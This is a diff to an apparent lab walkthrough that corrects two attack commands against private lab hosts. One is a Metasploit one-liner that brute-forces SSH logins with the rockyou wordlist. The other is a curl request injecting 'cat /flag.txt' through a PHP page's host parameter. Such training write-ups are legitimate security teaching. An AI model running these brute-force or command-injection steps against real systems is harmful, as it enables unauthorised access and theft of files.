@@ -54,8 +54,9 @@ ssh svc@172.28.0.32           # password from hydra (password123, ~line 1400 of 
 Then, the same credential, via Metasploit (compare the workflow):
 
 ```bash
-msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; \
-  set USERNAME svc; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; sessions -l; exit'
+# One line — do NOT split the -x '...' string across lines; a backslash inside
+# the single quotes is sent literally to msfconsole and breaks the next command.
+msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; set USERNAME svc; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; sessions -l; exit'
 ```
 
 **Why this works:** the `svc` account was created with the weak password
@@ -73,7 +74,9 @@ the box."
 ## 4. Web command injection
 
 ```bash
-curl 'http://172.28.0.33/cmd.php?host=127.0.0.1;cat /flag.txt'
+# The space in `cat /flag.txt` must be URL-encoded as %20 — modern curl rejects
+# a raw space in a URL ("curl: (3) URL rejected: Malformed input to a URL function").
+curl 'http://172.28.0.33/cmd.php?host=127.0.0.1;cat%20/flag.txt'
 ```
 
 **Why this works:** `cmd.php` takes the `host` query parameter and
